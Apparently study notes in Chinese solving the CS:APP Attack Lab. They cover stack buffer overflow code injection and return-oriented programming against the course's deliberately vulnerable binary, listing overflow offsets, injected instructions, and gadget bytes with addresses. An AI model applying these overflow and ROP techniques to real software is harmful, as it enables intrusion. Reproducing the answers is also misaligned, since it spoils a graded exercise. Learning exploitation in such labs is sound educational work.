# Code Inject

## Phase-1
1. `getbuf`的栈帧是40Byte，以及8Byte的返回地址。
2. 通过`getbuf`48个Byte，就可以改变返回地址。
3. 改变返回地址为 `touch1` 的首地址，程序跳转到`touch1`

## Phase-2
1. 修改`getbuf`的返回地址 => 输入的机器指令首地址
2. 需要的机器指令
    1. `touch2` 需要参数传递，需要将`cookie`传到 `rdi`寄存器中：mov    $0x59b997fa,%rdi
    2. 修改 `rsp`，将`rsp`指向 `touch2` 的首地址（**这一步可以用pushq，把地址压栈**）
    3. `retq`，根据`rsp`存储位置的地址，跳转
    4. `nop`
    5. `touch2` 的首地址

## Phase-3
1. 修改`getbuf`的返回地址 => 输入的机器指令首地址
2. `hexmatch` 和 `strncmp` 会往栈里压数据，导致数据被覆盖，将字符串 填充 在 返回地址 后面
3. 字符串后面跟需要`\0`
4. 需要的机器指令
    1. 字符串首地址要传给 `rdi`，由`rdi`在`touch3`中传给`hexmatch`，作为第二个参数
    2. 用`pushq`，把`touch3`地址压栈
    3. `retq`，根据`rsp`当前存储地址，跳转
    4. `nop`
    5. `touch2` 的首地址
    6. 字符串`59b997fa` => `35 39 62 39 39 37 66 61`

# Return-Oriented Programming

## Phase-4
1. 跳转到指定的gadget：
    1. 传递参数 `0x59b997fa` 给 `rdi`
    2. `popq %rax`：先得到cookie，再`rsp`指向下一个gadget
    3. `movq $rax %rdi`：将cookie传给`rdi`，作为touch2的参数
2. `rsp`地址为 `4017ec` 跳转到 `touch2`

`movq %rax %rdi`
+ addval_273: 48 89 c7 c3               4019a2
+ setval_426: 48 89 c7 90 c3

`movq $rsp $rax`
+ addval_190: 48 89 e0 c3               401a06
+ setval_350: 48 89 e0 90 c3

`popq $rax`
+ getval_280: 58 90 c3                  4019cc
+ addval_219: 58 90 c3

## Phase-5
由于地址是8位的，必须使用`movq`从rsp传到rdi中
偏移量不会达到8位，因此可以使用`movl`

1. movq %rsp %rax
2. movq %rax %rdi
3. popq %rax
4. bias = 0x50
5. movl %eax %edx
6. movl %edx %ecx
7. movl %ecx %esi
8. lea (%rdi,%rsi,1),%rax
9. movq %rax %rdi
10. touch3_addresss
11. str + '\0'


`lea (%rdi,%rsi,1),%rax`
+ add_xy: 48 8d 04 37 c3                4019d6


`movl %ecx %esi`
addval_436: 89 ce 90 90 c3              401a13

`movl %edx %ecx`
getval_159: 89 d1 38 c9                 401a34
> 38 c9 是 `cmpb %cl %cl`，不会改变寄存器

`movl %eax %edx`
getval_481: 89 c2 90                    4019dd